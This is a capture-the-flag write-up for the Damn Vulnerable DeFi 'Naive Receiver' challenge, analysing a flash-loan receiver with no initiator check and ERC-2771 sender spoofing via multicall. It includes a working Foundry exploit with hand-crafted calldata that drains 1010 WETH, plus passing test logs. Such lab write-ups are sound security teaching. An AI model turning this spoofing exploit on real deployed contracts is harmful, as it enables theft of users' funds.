# Challenge - Naive Receiver

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract.

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

## Objective of CTF

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

## Vulnerability Analysis

### Root Cause 1: Untrusted Flashloan Initiator

The `onFlashLoan` function in the `FlashLoanReceiver` contract is an implementation of the `IERC3156FlashBorrower` interface. However, in this implementation, the `initiator` and `data` parameters are completely ignored. Additionally, the function lacks any restrictions on who can initiate the flash loan.

Since there are no restrictions on who can initiate flash loans, and each flash loan incurs a fixed fee of 1 WETH, an attacker can continuously initiate flash loans on behalf of the `FlashLoanReceiver`. This process will eventually drain all the WETH from the `FlashLoanReceiver` contract.

The prototype for the `onFlashLoan` function in the `IERC3156FlashBorrower` interface is:

```solidity
function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
) external returns (bytes32);
```

The implementation of the `onFlashLoan` function in the `FlashLoanReceiver` contract is as follows:

```solidity
function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32)
{
    assembly {
        // gas savings
        if iszero(eq(sload(pool.slot), caller())) {
            mstore(0x00, 0x48f5c3ed)
            revert(0x1c, 0x04)
        }
    }

    if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

    uint256 amountToBeRepaid;
    unchecked {
        amountToBeRepaid = amount + fee;
    }

    _executeActionDuringFlashLoan();

    // Return funds to pool
    WETH(payable(token)).approve(pool, amountToBeRepaid);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

### Root Cause 2: Arbitrary Address Spoofing

The `NaiveReceiverPool` contract supports meta-transactions (ERC-2771) and designates the `BasicForwarder` contract as a trusted forwarder. When interacting with `NaiveReceiverPool` via meta-transactions, the forwarder sends transactions on behalf of the user. However, in this context, the `msg.sender` during the transaction becomes the forwarder. To preserve the original user address, the forwarder appends the user's address to the end of the user's request in the `request.data`, as shown in the following code snippet:

```solidity
bytes memory payload = abi.encodePacked(request.data, request.from);
```

When `NaiveReceiverPool` needs to retrieve the `msg.sender`, it does so by parsing the data through the `msgSender()` function, which reconstructs the original user address. The code for this is as follows:

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

The `_msgSender()` function checks whether the `msg.sender` is the forwarder and if the length of `msg.data` is at least 20 bytes. If both conditions are met, it returns the last 20 bytes of `msg.data` as the `msg.sender`.

At this point, we understand how `msg.sender` is retrieved in the meta-transactions mode, but this is not sufficient to enable `msg.sender` spoofing. To achieve arbitrary `msg.sender` spoofing, we need to use the `multicall` function provided by `NaiveReceiverPool`, as shown in the following code:

```solidity
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    return results;
}
```

### Attack steps:

1. Exhaust all WETH in the receiver contract by initiating a flashloan. Now, `NaiveReceiverPool` has 1,010 WETH.
2. Craft a calldata to bypass `_msgSender()` and call the `withdraw()` function in `NaiveReceiverPool` to withdraw all WETH from the developer to the player.
3. Transfer all WETH from the player to the recovery.

## PoC test case

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import { Test, console } from "forge-std/Test.sol";
import { NaiveReceiverPool, Multicall, WETH } from "../../src/naive-receiver/NaiveReceiverPool.sol";
import { FlashLoanReceiver } from "../../src/naive-receiver/FlashLoanReceiver.sol";
import { BasicForwarder } from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{ value: WETH_IN_POOL }(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{ value: WETH_IN_RECEIVER }();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint("WETH balance in the receiver contract", weth.balanceOf(address(receiver)), weth.decimals());
        emit log_named_decimal_uint("WETH balance in the pool contract", weth.balanceOf(address(pool)), weth.decimals());
        emit log_named_decimal_uint("WETH balance in the recovery contract", weth.balanceOf(address(recovery)), weth.decimals());

        // Executing flashloan without the user's consent
        // This will exhaust all WETH in the receiver contract.
        for (uint256 i; i < 10; ++i) pool.flashLoan(receiver, address(weth), 1 ether, hex"");

        // spoof as the deployer to withdraw all WETH tokens to the player
        // craft a calldata to bypass _msgSender and achieve arbitrary address spoofing
        //ac9650d8                                                         -> multicall(bytes[]) signature
        //0000000000000000000000000000000000000000000000000000000000000020 -> bytes[] offset
        //0000000000000000000000000000000000000000000000000000000000000001 -> length of the array
        //0000000000000000000000000000000000000000000000000000000000000020 -> bytes[1] offset
        //0000000000000000000000000000000000000000000000000000000000000058 -> length of the bytes[1]
        //00f714ce                                                         -> withdraw(uint256,address) signature
        //000000000000000000000000000000000000000000000036c090d0ca68880000 -> 1010 ether in hexadecimal
        //00000000000000000000000044E97aF4418b7a17AABD8090bEA0A471a366305C -> player address
        //aE0bDc4eEAC5E950B67C6819B118761CaAF61946                         -> deployer address (the address we want to spoof as the `msg.sender`)

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: 0,
            data: hex"ac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000005800f714ce000000000000000000000000000000000000000000000036c090d0ca6888000000000000000000000000000044E97aF4418b7a17AABD8090bEA0A471a366305CaE0bDc4eEAC5E950B67C6819B118761CaAF61946",
            deadline: block.timestamp
        });

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // execute ----> multicall ---> withdraw
        forwarder.execute(request, signature);

        // transfer all WETH to the recovery address
        weth.transfer(recovery, 1010 ether);

        emit log("-------------------------- After exploit --------------------------");
        emit log_named_decimal_uint("WETH balance in the receiver contract", weth.balanceOf(address(receiver)), weth.decimals());
        emit log_named_decimal_uint("WETH balance in the pool contract", weth.balanceOf(address(pool)), weth.decimals());
        emit log_named_decimal_uint("WETH balance in the recovery contract", weth.balanceOf(address(recovery)), weth.decimals());
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
```

### Test Result

```
Ran 2 tests for test/naive-receiver/NaiveReceiver.t.sol:NaiveReceiverChallenge
[PASS] test_assertInitialState() (gas: 34878)
[PASS] test_naiveReceiver() (gas: 431355)
Logs:
  WETH balance in the receiver contract: 10.000000000000000000
  WETH balance in the pool contract: 1000.000000000000000000
  WETH balance in the recovery contract: 0.000000000000000000
  -------------------------- After exploit --------------------------
  WETH balance in the receiver contract: 0.000000000000000000
  WETH balance in the pool contract: 0.000000000000000000
  WETH balance in the recovery contract: 1010.000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.35ms (1.77ms CPU time)

Ran 1 test suite in 260.81ms (7.35ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

## References

1. https://www.rareskills.io/post/erc-3156
2. https://www.rareskills.io/post/abi-encoding
3. https://docs.soliditylang.org/en/latest/abi-spec.html
4. https://www.alchemy.com/overviews/meta-transactions
5. https://blog.openzeppelin.com/arbitrary-address-spoofing-vulnerability-erc2771context-multicall-public-disclosure
